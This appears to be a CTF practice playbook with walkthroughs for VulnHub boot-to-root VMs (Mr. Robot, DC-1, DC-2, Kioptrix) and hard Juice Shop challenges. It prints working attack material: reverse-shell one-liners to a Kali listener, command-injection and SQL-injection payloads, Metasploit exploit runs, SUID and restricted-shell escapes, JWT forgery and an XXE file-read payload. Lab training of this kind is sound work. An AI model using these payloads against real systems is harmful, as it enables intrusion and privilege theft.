# 52 — Day 4 CTF: Harder VulnHub VM Walkthroughs + Juice Shop Hard

> Day plan reminder: this is **Day 4** in the new schedule. By now you've completed Day 1 (MA1+MA2), Day 2 (Security Hardening / SOC), Day 3 morning (Juice Shop warm-up), Day 3 afternoon (first VulnHub VM). Day 4 is the harder stuff.

**Time:** 6 hours.
**Pre-req:** `06_Setup_VulnHub.md` and `51_Day3_VulnHub_BootToRoot.md` complete.

This file gives **concrete walkthroughs** for the most-likely VulnHub VMs. Practising on these directly **is** the best preparation — the chief said random-pick from VulnHub, and these are statistically the most popular targets.

> 🚨 **Practice rule:** read each walkthrough **AFTER** trying the VM yourself for at least 60 minutes. Reading first ruins the learning. The goal during practice is to internalise the *patterns*, not memorise solutions.

---

## How to use this file

For each VM:
1. Spin it up per `06_…` Part E.
2. Run Phase 1–2 of `41_…` (discover + enumerate).
3. **Stop and try.** No peeking.
4. After 60 min stuck on a phase, read just that phase's hint below.
5. Take a snapshot before privesc so you can replay it.

> All walkthroughs use `$TGT` for the target IP. Set it before each session: `export TGT=<ip-from-netdiscover>`.

---

## Walkthrough 1 — Basic Pentesting: 1

**Author:** Josiah Pierce
**VulnHub link:** `vulnhub.com/entry/basic-pentesting-1,216/`
**Difficulty:** Beginner. Multiple paths to root — pick whichever you find first.
**Why practice this first:** the most forgiving VM, with three independent foothold paths.

### Phase 1–2: Recon
You should find these ports open:
- **21** ProFTPD (note version — old releases of ProFTPD 1.3.3 have backdoor exploits)
- **22** OpenSSH
- **80** Apache + a hidden directory; gobuster `/usr/share/wordlists/dirb/common.txt` will surface it (the directory name relates to "secret")

### Phase 3: Foothold (multiple paths — try ANY of them)

**Path A — ProFTPD 1.3.3c backdoor**
- `searchsploit proftpd 1.3.3` — look for "Backdoor Command Execution" Metasploit module.
- Exploit gives a shell as the FTP service user.

**Path B — Web → WordPress**
- The hidden directory hosts a WordPress install.
- WordPress login → try **admin / admin** (intentionally weak).
- Once in: *Appearance → Editor → 404.php* → paste a PHP reverse-shell:
  ```php
  <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1'"); ?>
  ```
- Visit any non-existent page (triggers 404.php) with `nc -lvnp 4444` listening.

**Path C — SSH brute force a known user**
- With wpscan/enum, you'll uncover usernames.
- Hydra them against SSH with rockyou — the box ships with at least one weak credential.

### Phase 4: Privilege escalation
- Run `sudo -l` first. Then look at SUID with `find / -perm -4000 -type f 2>/dev/null`.
- Kernel privesc is also viable (`uname -a` → `searchsploit linux kernel`).

### Phase 5: Flag
- `/root/flag.txt` (or similar — confirm with `find / -name "flag*" 2>/dev/null` once root).

---

## Walkthrough 2 — Mr. Robot: 1

**Author:** Leon Johnson
**VulnHub link:** `vulnhub.com/entry/mr-robot-1,151/`
**Difficulty:** Beginner-Intermediate. **3 keys** total — find them all.
**Why famous:** themed after the TV show; one of the most-recommended training VMs.

### Phase 1–2: Recon
Ports usually 22, 80, 443. **Don't skip /robots.txt** — it leaks Key 1's location and a dictionary file (`fsocity.dic`).

### Phase 3: Foothold
- The web UI has a **WordPress** login at `/wp-login.php`.
- Username from the show: `elliot`.
- Password: brute-force with `fsocity.dic` (the wordlist downloaded from /robots.txt). It contains many duplicates — `sort -u fsocity.dic > clean.dic` first to speed up.
- Once logged in: WordPress *Appearance → Editor → 404.php* → drop a PHP reverse shell (same template as Walkthrough 1) → trigger.

### Phase 4: Lateral + privesc
- You land as `daemon`. Look in `/home/robot/`. There's a file you can't read (`key-2-of-3.txt`) and **`password.raw-md5`** which you CAN read.
- Crack the MD5 with hashcat:
  ```bash
  hashcat -m 0 -a 0 password.raw-md5 /usr/share/wordlists/rockyou.txt
  ```
- Login as `robot` via `su` (now you can `cat key-2-of-3.txt`).
- Then check `find / -perm -4000 -type f 2>/dev/null` — note **`nmap`** in the SUID list.
- Old `nmap` (versions before ~5.21) had an interactive mode:
  ```bash
  nmap --interactive
  nmap> !sh
  #
  ```
- That gives a root shell. Read `/root/key-3-of-3.txt`.

### Flags expected
- key-1-of-3.txt (in /robots.txt → web)
- key-2-of-3.txt (/home/robot/)
- key-3-of-3.txt (/root/)

---

## Walkthrough 3 — DC-1

**Author:** DCAU
**VulnHub link:** `vulnhub.com/entry/dc-1,292/`
**Difficulty:** Beginner. **5 flags**.
**Why practice:** very common in CTFs as the prototypical "old Drupal box".

### Phase 1–2: Recon
- Ports 22, 80, 111 typically.
- Web is **Drupal 7**. Whatweb confirms the version.

### Phase 3: Foothold (Drupalgeddon 2 — CVE-2018-7600)
- `searchsploit drupal 7` → look for "Drupalgeddon 2 / Drupal 7.x Module Services / RCE".
- The Metasploit module `exploit/unix/webapp/drupal_drupalgeddon2` works out-of-the-box:
  ```
  msfconsole
  use exploit/unix/webapp/drupal_drupalgeddon2
  set RHOSTS $TGT
  run
  ```
- You'll get a meterpreter or generic shell as `www-data`.

### Phase 4: Privesc
- Standard SUID hunt:
  ```bash
  find / -perm -4000 -type f 2>/dev/null
  ```
- Look for **`find`** as SUID (typical on this VM):
  ```bash
  find . -exec /bin/sh -p \; -quit
  ```
- `-p` preserves the SUID-elevated EUID.

### Flags
- 5 flags scattered: web root, `/home/flag4/`, `/root/`, mysql DB, etc. Read each `flag*.txt` for hints toward the next.

---

## Walkthrough 4 — DC-2

**Author:** DCAU
**VulnHub link:** `vulnhub.com/entry/dc-2,311/`
**Difficulty:** Beginner-Intermediate. Teaches **non-standard SSH ports + restricted shell escape**.

### Phase 1–2: Recon
- Web on 80, **SSH on 7744** (note: not 22 — easy to miss). Always nmap `-p-` to catch this.
- Add a hosts entry: `echo "$TGT dc-2" | sudo tee -a /etc/hosts` (the WordPress site uses `dc-2` as hostname).
- Visit `http://dc-2/` → WordPress.

### Phase 3: Foothold
- **flag.txt** at `http://dc-2/` hints: use **cewl** to scrape words from the site, then wpscan.
  ```bash
  cewl http://dc-2/ -m 6 -w site.dic
  wpscan --url http://dc-2/ --enumerate u
  wpscan --url http://dc-2/ --usernames users.txt --passwords site.dic
  ```
- You'll find creds for users `jerry` and `tom`.
- `tom` can SSH to port 7744 but lands in **rbash** (restricted shell). Escape with:
  ```bash
  vi  # then in vi: :set shell=/bin/bash, :shell
  ```
  or:
  ```bash
  BASH_CMDS[a]=/bin/sh; a
  export PATH=$PATH:/bin:/usr/bin
  ```
- Then `su - jerry` (jerry's password from wpscan).

### Phase 4: Privesc
- `sudo -l` as jerry shows `git` as NOPASSWD.
- GTFOBins → `git`:
  ```bash
  sudo git -p help config
  # In the pager: !/bin/bash
  ```
- Root.

### Flags
- 5 flags through the chain.

---

## Walkthrough 5 — Kioptrix: Level 1

**Author:** loneferret / Kioptrix
**VulnHub link:** `vulnhub.com/entry/kioptrix-level-1-1,22/`
**Difficulty:** Beginner. Old-school exploits.
**Network setup:** ⚠️ This VM uses a fixed MAC and may struggle to get DHCP — easier with a small VirtualBox host-only network.

### Phase 1–2: Recon
- Open ports include 22, 80, 111, 139, 443.
- Apache version is **very old** (`Apache 1.3.20`); mod_ssl is also old.
- Samba 2.2.x.

### Phase 3 + 4: Direct root via known exploit
Either of these gives root immediately:

**Path A — mod_ssl OpenLuck (OpenFuck)**
- Compile the classic `OpenFuck.c` exploit (`searchsploit openluck`) — note the modern compile flags needed because of header drift:
  ```bash
  searchsploit -m 764         # OpenFuck.c
  gcc -o openfuck 764.c -lcrypto
  ./openfuck 0x6b $TGT 443    # 0x6b = OS fingerprint
  ```
- Direct root shell on success.

**Path B — Samba trans2open**
- `searchsploit samba 2.2`. Use `exploit/linux/samba/trans2open` in Metasploit:
  ```
  use exploit/linux/samba/trans2open
  set RHOSTS $TGT
  set payload linux/x86/shell_reverse_tcp
  set LHOST <KALI_IP>
  run
  ```

### Flag
- `/root/` — read whatever's there (the VM's "win" condition is the root shell itself).

---

## Walkthrough 6 — Kioptrix: Level 2

**Author:** Kioptrix
**VulnHub link:** `vulnhub.com/entry/kioptrix-level-11-2,23/`
**Difficulty:** Beginner. Teaches **SQLi → command injection → kernel exploit**.

### Phase 1–2: Recon
- Web on 80 (login form).

### Phase 3: Foothold
- Login form is SQLi-vulnerable: user `admin`, password `' OR 1=1 --`.
- Inside admin panel there's a "ping" form that runs `ping <input>` server-side **without sanitisation**. Inject:
  ```
  127.0.0.1; bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1
  ```
- nc listener catches the shell as `apache` (CentOS).

### Phase 4: Privesc
- `uname -a` → CentOS 4.x with kernel 2.6.x.
- `searchsploit linux kernel 2.6 centos` — the well-known Linux kernel local privesc (often called by exploit-DB ID 9542 — verify by date and CentOS version) compiles and runs to give root.

### Flag
- The root shell + read `/etc/passwd`/`/etc/shadow` is the proof.

---

## Walkthrough 7 — Juice Shop ★5–★6 (web-only days)

If a CTF day is web-focused (Juice Shop only), use these. Already covered in detail in the previous version of this file; key challenges and approaches:

### Forged Signed JWT (★6)
1. `localStorage.token` → copy.
2. `jwt_tool <token>` → header is `RS256`.
3. Forge with `alg:none`:
   ```bash
   jwt_tool <token> -X a -I -pc email -pv jwtn3d@juice-sh.op
   ```
4. Replace `localStorage.token` in the browser with the new token. Refresh.

### SSRF via profile-photo URL (★6)
- *Profile → Image URL* → submit `http://localhost:3000/api/Users/1`.
- Server fetches the URL with internal context, returns user data.

### XXE Tier 1 (★4) → Tier 2 (★5)
- Premium membership area (forge JWT to enter) → submit XML feedback:
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <root>&xxe;</root>
  ```
- Tier 2: billion-laughs DoS (use sparingly — may hang the container).

### Premium Paywall (★5)
- Read `main.js` (it's served as static asset). Find the `paywall` token decoder. Compute a valid token offline. Submit via URL.

### Vulnerable Library — Critical (★5)
- `cat package.json` (in your local Juice Shop install).
- Identify a deprecated lib with a known CVE.
- Submit via Contact Us form: exact format `<library-name> <version> (CVE-XXXX-YYYY)`.

---

## Mixing modes (most likely scenario)

The chief implied **multiple sources** (Juice Shop + VulnHub random pick). The realistic pattern:

| Day | Likely format | Files to use |
|---|---|---|
| Day 2 (warm-up) | Juice Shop ★1–★3 | `40_…` |
| Day 3 | 1 medium VulnHub VM (e.g. DC-1, Mr. Robot) + ★4 Juice Shop | `41_…` boot-to-root section |
| Day 4 | 1 harder VulnHub VM (DC-3+, Kioptrix) + ★5+ Juice Shop | this file |

If days are different — adapt. The methodology is identical, only the time-allocation changes.

---

## Mark-tracking template (copy into a notebook)

| Day | VM / Challenge | ★ / difficulty | Solved? | Time | Hint used? |
|---|---|---|---|---|---|
| Day 2 | Juice Shop: Score Board | ★1 | ☐ | __ | none |
| Day 2 | Juice Shop: Login Admin | ★2 | ☐ | __ | __ |
| Day 3 | DC-1 (foothold) | mid | ☐ | __ | __ |
| Day 3 | DC-1 (privesc) | mid | ☐ | __ | __ |
| Day 4 | DC-2 (foothold + privesc) | mid | ☐ | __ | __ |
| Day 4 | Juice Shop: Forged JWT | ★6 | ☐ | __ | __ |

Convert to flag IDs once the chief publishes the ASEAN→VM mapping.

---

## Post-CTF documentation (per CTF rules section 12)

Each team submits **`team1_CTF_Report.pdf`** containing:
- Step-by-step solutions
- Tools used
- Screenshots as proof

Write the section for each VM as you go (in a markdown file you'll convert later). Don't leave it to the end.

---

End of CTF playbook series. Final files: **`90_Practice_Schedule.md`** + **`99_Marking_Map.md`** (already updated to reflect VulnHub).
